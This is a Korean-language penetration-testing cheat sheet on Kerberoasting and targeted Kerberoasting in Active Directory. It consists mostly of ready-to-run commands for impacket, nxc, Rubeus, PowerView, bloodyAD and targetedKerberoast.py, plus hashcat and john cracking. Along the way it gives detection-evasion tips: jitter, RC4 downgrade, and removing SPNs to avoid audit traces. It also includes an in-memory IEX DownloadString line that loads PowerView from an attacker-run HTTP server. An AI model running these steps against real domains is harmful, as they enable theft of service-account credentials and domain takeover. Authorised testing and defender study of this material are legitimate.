# 04_Kerberoasting

# AD 외부침투 — Kerberoasting

---

## 개념

Kerberoasting은 SPN(Service Principal Name)이 등록된 서비스 계정의 TGS(Ticket Granting Service, 서비스 티켓)를 요청해 오프라인으로 크래킹하는 공격이다. Kerberos 프로토콜 설계상 모든 도메인 유저는 권한과 무관하게 도메인 내 어떤 서비스에 대해서도 TGS를 자유롭게 요청할 수 있다. 그리고 이 TGS는 해당 서비스 계정의 NTLM 해시로 암호화되어 있기 때문에, 티켓 자체를 파일로 저장해 오프라인에서 크래킹하는 것이 가능하다.

AS-REP Roasting과의 핵심 차이는 유효한 도메인 자격증명이 반드시 필요하다는 점이다. 단, 낮은 권한의 일반 계정 하나만 있으면 도메인 내 모든 SPN 계정을 대상으로 시도할 수 있다.

TGS는 기본적으로 RC4(type 23) 또는 AES(type 17/18)로 암호화된다. RC4가 AES보다 크래킹이 수십~수백 배 빠르다. Windows Server 2016 이하 환경에서는 AES만 지원하는 계정에도 RC4로 다운그레이드 요청이 가능하다(`tgtdeleg` 트릭). Windows Server 2019 이상에서는 이 다운그레이드가 차단된다.

서비스 계정은 보통 사람이 직접 패스워드를 설정하기 때문에 취약한 패스워드를 가지고 있는 경우가 많다. 특히 수년 전에 설정된 후 변경되지 않은 계정이 주요 타겟이다. 또한 서비스 계정이 높은 권한(Domain Admins 등)을 가진 경우 크래킹 성공 시 즉각적인 도메인 장악으로 이어진다.

---

## SPN 계정 열거 (공격 전 사전 확인)

실제 TGS를 요청하기 전에 먼저 어떤 SPN 계정이 있는지 파악하는 것이 좋다. 패스워드가 오래된 계정, admincount=1인 고권한 계정을 우선 타겟으로 삼아야 효율적이다.

```bash
# SPN 계정 목록만 확인 (해시 요청 없음)
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP>

# 출력: ServicePrincipalName, Name, MemberOf, PasswordLastSet, LastLogon
# -> PasswordLastSet이 수년 전이면 우선 타겟

# pwdLastSet 기준 정렬 (가장 오래된 계정 먼저)
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> | sort -k5

# nmap으로 SPN 열거
nmap -p 88 --script=krb5-enum-users \
  --script-args krb5-enum-users.realm='corp.local' <DC_IP>
```

---

## impacket-GetUserSPNs

GetUserSPNs는 도메인에 SPN이 등록된 모든 유저 계정을 LDAP으로 조회한 뒤, 각 계정에 대해 TGS를 요청해 해시를 반환한다. `-request` 없이 실행하면 계정 목록만 조회하고, `-request`를 붙이면 실제 TGS를 요청해 해시를 뽑는다.

- `outputfile` 미사용 시에도 터미널에 해시가 직접 출력되므로 리다이렉션으로 파일에 저장할 수 있다.

```bash
# 전체 SPN 계정 TGS 요청
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request \
  -outputfile kerb.hashes

# hashcat 포맷 명시
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile kerb.hashes

# 특정 계정만 타겟 (Targeted Kerberoasting)
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request-user svc_sql \
  -outputfile kerb.hashes

# NTLM 해시로 인증
impacket-GetUserSPNs corp.local/john \
  -hashes :<NTLM> \
  -dc-ip <DC_IP> \
  -request \
  -outputfile kerb.hashes

# Kerberos 인증 (ccache 있을 때)
export KRB5CCNAME=/tmp/john.ccache
impacket-GetUserSPNs corp.local/john \
  -k -no-pass \
  -dc-ip <DC_IP> \
  -request \
  -outputfile kerb.hashes

# 터미널 직접 출력 후 파일로
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request 2>/dev/null | grep '\$krb5tgs\$' > kerb.hashes

# 파일 확인
cat kerb.hashes
wc -l kerb.hashes
```

---

## nxc

```bash
# 기본
nxc ldap <DC_IP> -u john -p 'Password1!' --kerberoasting kerb.hashes

# NTLM 해시로
nxc ldap <DC_IP> -u john -H <NTLM> --kerberoasting kerb.hashes

# DC FQDN 지정
nxc ldap <DC_IP> -u john -p 'Password1!' \
  --kerberoasting kerb.hashes \
  --kdcHost dc01.corp.local
```

---

## Rubeus (Windows)

Rubeus는 Kerberoasting에 있어서 impacket보다 더 세밀한 제어가 가능하다. `/stats`로 먼저 전체 현황(계정 수, 암호화 타입, 패스워드 나이)을 파악한 뒤 타겟을 좁혀서 공격하는 것이 효율적이다.

`/tgtdeleg`는 TGT 위임을 악용해 RC4 티켓을 요청하는 트릭으로, AES가 활성화된 계정에도 RC4 해시를 뽑아낼 수 있다. 다만 Windows Server 2019 이상의 환경에서는 동작하지 않으며, 보안 제품에서 탐지할 수 있다. `/rc4opsec`는 AES가 없는 계정만 대상으로 RC4 요청을 하는 더 안전한 방식이다.

`/nowrap` 없으면 해시가 줄바꿈되어 hashcat에 바로 넣을 수 없으므로 반드시 붙인다.

```powershell
# 통계 먼저 확인 (암호화 타입, 패스워드 나이 파악)
.\Rubeus.exe kerberoast /stats

# 전체 SPN 계정 대상
.\Rubeus.exe kerberoast /outfile:kerb.hashes /nowrap

# RC4 다운그레이드 (AES 계정도 RC4로 — Windows 2019 이전에서만)
.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerb.hashes /nowrap

# AES 없는 계정만 RC4로 (더 안전한 방식)
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerb.hashes /nowrap

# 특정 유저 타겟
.\Rubeus.exe kerberoast /user:svc_sql /outfile:kerb.hashes /nowrap
.\Rubeus.exe kerberoast /tgtdeleg /user:svc_sql /outfile:kerb.hashes /nowrap

# admincount=1 고권한 계정 우선 타겟
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /outfile:kerb.hashes /nowrap

# 탐지 회피 — 지연 및 jitter 추가
.\Rubeus.exe kerberoast /outfile:kerb.hashes /nowrap /delay:3000 /jitter:50

# AES 계정만 AES로 요청 (탐지 회피, 크래킹 느림)
.\Rubeus.exe kerberoast /aes /outfile:kerb.hashes /nowrap
```

---

## PowerView (Windows / SPN 계정 열거)

PowerView는 직접 해시를 추출하지 않지만 SPN 계정을 세밀하게 필터링하는 데 유용하다. `Get-DomainSPNTicket`을 사용하면 PowerView 자체적으로 TGS를 요청해 해시를 출력할 수도 있다.

```powershell
Import-Module .\PowerView.ps1

# SPN 있는 모든 계정 열거
Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname, pwdlastset

# 고권한 SPN 계정 (admincount=1)
Get-DomainUser -SPN | `
  Where-Object {$_.admincount -eq 1} | `
  Select-Object samaccountname, serviceprincipalname, pwdlastset

# 패스워드 오래된 순으로 정렬 (타겟 우선순위)
Get-DomainUser -SPN | `
  Select-Object samaccountname, serviceprincipalname, pwdlastset | `
  Sort-Object pwdlastset

# PowerView로 직접 TGS 요청 및 해시 추출
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | `
  Export-Csv .\kerb.csv -NoTypeInformation

# 특정 계정 SPN 티켓
Get-DomainSPNTicket -SPN "MSSQLSvc/sql01.corp.local:1433" -Format Hashcat

# setspn으로 SPN 목록 확인 (기본 내장)
setspn -Q */* | findstr /v "CN="
```

---

## Targeted Kerberoasting (SPN 강제 설정 후 공격)

GenericAll, GenericWrite, WriteProperty, Validated-SPN 권한이 있는 계정으로 SPN이 없는 대상 계정에 SPN을 강제 설정해 Kerberoastable 상태로 만드는 공격이다. 일반 Kerberoasting은 이미 SPN이 등록된 계정만 대상으로 하지만, Targeted Kerberoasting은 이런 ACL 권한을 악용해 원래 공격 대상이 아니었던 고권한 계정까지 공격 범위를 확장할 수 있다. BloodHound에서 GenericWrite 엣지가 발견되면 즉시 활용 가능하다.

컴퓨터 계정, 관리형 서비스 계정(MSA), 그룹 관리형 서비스 계정(gMSA)에 설정된 SPN은 패스워드가 120자 랜덤 문자열이라 크래킹이 불가능하다. 반드시 유저 계정 대상으로만 시도한다.

---

### 1. SPN 수동 설정 후 TGS 요청

### Linux — bloodyAD로 SPN 설정 → GetUserSPNs으로 TGS 요청

칼리에서 직접 실행하는 방식이다. bloodyAD는 LDAP을 통해 AD 오브젝트 속성을 수정하므로 도메인에 참여한 Windows 머신 없이도 동작한다.

```bash
# SPN 설정
# --host: DC의 IP 또는 FQDN
# -d: 도메인 이름
# -u: GenericWrite 권한을 가진 계정
# -p: 해당 계정의 패스워드
# set object: AD 오브젝트의 특정 속성을 수정하는 명령
# targetuser: SPN을 설정할 대상 계정 (sAMAccountName)
# servicePrincipalName: 수정할 속성명 (SPN이 저장되는 AD 속성)
# -v 'http/fake': 설정할 SPN 값 (실제 서비스가 존재하지 않아도 되며 형식만 맞으면 됨)
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set object targetuser servicePrincipalName -v 'http/fake'

# NTLM 해시로 인증
# PtH(Pass-the-Hash) 상태에서 패스워드 없이 해시만으로 바로 사용 가능
# -H: LM:NTLM 또는 :NTLM 형식으로 입력 (LM은 aad3b435...더미값 사용)
bloodyAD --host <DC_IP> -d corp.local -u john -H <NTLM> \
  set object targetuser servicePrincipalName -v 'http/fake'

# SPN 설정 확인
# get object: 특정 오브젝트의 속성값 조회
# --attr: 조회할 속성명 지정
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  get object targetuser --attr servicePrincipalName

# TGS 요청
# SPN이 설정되면 해당 계정이 Kerberoastable 상태가 됨
# GetUserSPNs이 KDC에 TGS를 요청하고 암호화된 해시를 반환
# -request-user: 특정 계정만 타겟으로 지정해 불필요한 요청 최소화
# -outputfile: 해시를 저장할 파일 경로 (이후 hashcat에 바로 사용 가능)
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request-user targetuser \
  -outputfile targeted.hashes

# 공격 완료 후 SPN 제거
# SPN을 제거하지 않으면 AD 감사 로그(Event ID 5136)에 속성 변경 흔적이 남음
# -v '': 빈 값으로 설정해 SPN 속성 초기화
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set object targetuser servicePrincipalName -v ''
```

### Windows — PowerView로 SPN 설정 → Rubeus로 TGS 요청

Windows 세션(evil-winrm, psexec 등)에서 실행하는 방식이다. PowerView를 세션에 먼저 로드한 뒤 SPN을 설정한다.

```powershell
# PowerView로 SPN 설정
# Set-DomainObject: 도메인 오브젝트의 속성을 수정하는 PowerView 함수
# -Identity: SPN을 설정할 대상 계정 (sAMAccountName)
# -Set: 설정할 속성과 값을 해시테이블 형식으로 지정
# serviceprincipalname: SPN이 저장되는 AD 속성 (소문자로 입력)
# -Verbose: 실행 결과를 상세하게 출력
Set-DomainObject -Identity targetuser `
  -Set @{serviceprincipalname='http/fake'} -Verbose

# SPN 설정 확인
Get-DomainUser -Identity targetuser -Properties serviceprincipalname

# Rubeus로 TGS 요청
# kerberoast: Kerberoasting 공격 모드
# /user: 타겟 계정 지정
# /nowrap: 해시를 한 줄로 출력 (줄바꿈 없이 hashcat에 바로 붙여넣기 가능)
# /outfile: 해시 저장 파일 경로
.\Rubeus.exe kerberoast /user:targetuser /nowrap /outfile:targeted.hashes

# 공격 완료 후 SPN 제거
# -Clear: 해당 속성을 빈 값으로 초기화
Set-DomainObject -Identity targetuser -Clear serviceprincipalname -Verbose
```

### [트러블슈팅] PowerView 로드 방법

PowerView는 외부 스크립트라 Windows 세션에 미리 로드해야 한다. 디스크에 파일을 남기지 않는 메모리 로드 방식이 탐지 회피에 유리하다.

먼저 칼리에서 PowerView를 다운로드한다.

```bash
# PowerView 단일 파일 다운로드
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

# 또는 PowerSploit 전체 클론
git clone https://github.com/PowerShellMafia/PowerSploit.git
# PowerView 경로: PowerSploit/Recon/PowerView.ps1
```

**방법 1 — 메모리 로드 (디스크에 파일 안 남음, 권장)**

칼리 HTTP 서버를 열고 Windows 세션에서 직접 메모리에 로드한다. 파일이 디스크에 저장되지 않아 AV 탐지 위험이 낮다.

```bash
# 칼리에서 PowerView.ps1 있는 디렉토리로 이동 후 HTTP 서버 실행
cd /opt/scripts/
python3 -m http.server 80
```

```powershell
# Windows 세션에서 HTTP 서버로부터 직접 메모리에 로드
# IEX(Invoke-Expression): 문자열을 PowerShell 명령으로 실행
# DownloadString: URL의 내용을 문자열로 다운로드해 IEX로 바로 실행
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/PowerView.ps1')

# 또는
IEX(IWR http://<칼리IP>/PowerView.ps1 -UseBasicParsing)
```

**방법 2 — evil-winrm -s 옵션**

evil-winrm으로 세션을 열 때 `-s`로 스크립트 디렉토리를 지정하면 세션 안에서 파일명만 입력해 바로 메모리 로드할 수 있다.

```bash
# 칼리에서 세션 열 때 PowerView가 있는 디렉토리를 -s로 지정
evil-winrm -i <IP> -u john -p 'Password1!' -s /opt/scripts/
```

```powershell
# 세션 안에서 파일명만 입력하면 자동으로 메모리 로드됨
*Evil-WinRM* PS> PowerView.ps1
```

**방법 3 — 파일 업로드 후 로드 (디스크에 파일 남음)**

```powershell
# evil-winrm 세션에서 칼리로부터 파일 업로드
# upload: 칼리 로컬 경로 → Windows 원격 경로 순서로 지정
*Evil-WinRM* PS> upload /opt/scripts/PowerView.ps1 C:\Temp\PowerView.ps1

# 업로드된 파일을 현재 세션에 로드
Import-Module C:\Temp\PowerView.ps1
```

---

### 2. targetedKerberoast.py (SPN 설정 + TGS 요청 + SPN 제거 자동화)

SPN 설정 → TGS 요청 → SPN 제거를 자동으로 처리한다. LDAP으로 GenericWrite 권한이 있는 계정을 자동으로 탐지하고, 각 계정에 임시 SPN을 설정해 TGS 해시를 추출한 뒤 SPN을 제거한다. 수동 SPN 설정이 필요 없고 한 번의 명령으로 도메인 전체를 스캔할 수 있어 효율적이다.

```bash
# 설치
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
pip install -r requirements.txt --break-system-packages

# 전체 도메인 유저 대상 실행
# -v: verbose 모드 (각 계정 처리 과정과 결과를 출력해 진행 상황 확인 가능)
# 내부 동작: SPN 있는 계정 → 일반 Kerberoast / GenericWrite 있는 계정 → SPN 임시 설정 후 Targeted Kerberoast
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP>

# 결과를 파일로 저장
# -o: 해시 저장 파일 경로 (hashcat에 바로 사용 가능)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  -o kerb.hashes

# 특정 유저만 타겟
# --request-user: 특정 계정만 대상으로 지정 (불필요한 LDAP 쿼리와 TGS 요청 최소화)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --request-user ethan

# NTLM 해시로 인증
# PtH 상태에서 패스워드 없이 해시만으로 바로 사용 가능
# -H: LM:NTLM 또는 :NTLM 형식 (LM은 aad3b435...더미값 사용)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -H <NTLM> \
  --dc-ip <DC_IP>

# Kerberos 인증 (ccache 있을 때)
# PtT나 getTGT로 얻은 티켓 파일이 있을 때 사용
# KRB5CCNAME 환경변수로 사용할 ccache 파일 경로 지정
# -k: Kerberos 인증 사용 / --no-pass: 패스워드 입력 생략
export KRB5CCNAME=john.ccache
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -k --no-pass \
  --dc-ip <DC_IP>

# 일반 Kerberoast만 (SPN 강제 설정 없이 기존 SPN 계정만 대상)
# --no-abuse: Targeted Kerberoast 없이 일반 Kerberoast만 수행
# SPN 설정 권한이 없거나 SPN 변경 흔적을 남기고 싶지 않을 때 사용
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --no-abuse

# Targeted만 (기존 SPN 계정 제외하고 GenericWrite 계정만 대상)
# --only-abuse: SPN 있는 계정은 건너뛰고 Targeted만 수행
# 이미 일반 Kerberoast를 별도로 수행했을 때 중복 제거 목적으로 사용
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --only-abuse

# LDAPS 사용 (LDAP 389포트가 방화벽으로 차단된 환경에서 636포트로 우회)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --use-ldaps

# 크로스 트러스트 공격 (도메인 신뢰 관계를 통해 다른 도메인 계정 대상)
# -D: 실제 공격 대상 도메인 (현재 인증 계정 도메인과 다를 때 지정)
# BloodHound에서 TrustedBy 엣지로 신뢰 관계 발견 시 활용
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  -D target.domain.local
```

---

### 크랙

추출된 해시 앞부분으로 암호화 타입을 구분한다. `$23$`은 RC4, `$17$`은 AES128, `$18$`은 AES256이다. RC4가 가장 빠르게 크래킹되고, 크래킹 성공 시 해당 계정의 평문 패스워드를 획득해 SMB/WinRM/LDAP 등으로 직접 로그인이 가능하다.

```bash
# RC4 (mode 13100) — 가장 빠름, $krb5tgs$23$* 형태
hashcat -m 13100 targeted.hashes /usr/share/wordlists/rockyou.txt

# 룰 기반 (단어 변형 패턴 적용으로 성공률 높음)
hashcat -m 13100 targeted.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES128 (mode 19600)
hashcat -m 19600 targeted.hashes /usr/share/wordlists/rockyou.txt

# AES256 (mode 19700)
hashcat -m 19700 targeted.hashes /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt targeted.hashes

# 결과 확인
hashcat -m 13100 targeted.hashes --show
john --show targeted.hashes
```

---

### [트러블슈팅] KRB_AP_ERR_SKEW (시간 동기화 오류)

Kerberos는 클라이언트와 DC의 시간 차이가 기본 ±5분을 초과하면 인증을 거부한다. VM 일시 정지, VPN 재연결, 스냅샷 복원 등으로 시간이 어긋나는 경우가 흔하다. 아래 에러가 발생하면 시간부터 맞춰야 한다.

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**방법 1 — net time (SMB 경유, 실전에서 가장 안정적)**
NTP 포트(123)가 막혀있어도 되고, 이미 가진 도메인 크리덴셜로 인증하므로 침투테스트 상황에 잘 맞는다.

```bash
sudo net time set -S <DC_IP> -U '<user>%<password>'   # ← 수정
date   # 확인
```

**방법 2 — ntpdate/rdate (NTP 프로토콜 경유, 포트 막혀있으면 실패)**

```bash
# 먼저 꺼야 ntpdate로 맞춘 시간이 바로 다시 틀어지지 않음
sudo timedatectl set-ntp off

sudo ntpdate -u <DC_IP>        # "no eligible servers" 뜨면 NTP 자체가 막힌 것 → 방법 1로 전환
# 또는
sudo apt install rdate -y
sudo rdate -n <DC_IP>

date   # 확인
sudo timedatectl set-ntp on    # 작업 완료 후 재활성화
```

---

## 크랙

```
$krb5tgs$23$*...  <- RC4   (mode 13100) — 가장 빠름
$krb5tgs$17$*...  <- AES128 (mode 19600)
$krb5tgs$18$*...  <- AES256 (mode 19700) — 가장 느림
```

```bash
# RC4 크랙 — mode 13100
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt

# 룰 기반
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# AES128
hashcat -m 19600 kerb.hashes /usr/share/wordlists/rockyou.txt

# AES256
hashcat -m 19700 kerb.hashes /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.hashes

# 결과 확인
hashcat -m 13100 kerb.hashes --show
john --show kerb.hashes
```

---

## 흐름

유효 자격증명 확보 → SPN 계정 목록 확인 (패스워드 나이, 권한 수준) → admincount=1 / 오래된 계정 우선 타겟 → TGS 해시 추출 → RC4 여부 확인 → tgtdeleg로 RC4 다운그레이드 시도 (2019 이전 환경) → hashcat 크래킹 → 서비스 계정 자격증명 확보 → 다음 단계 이동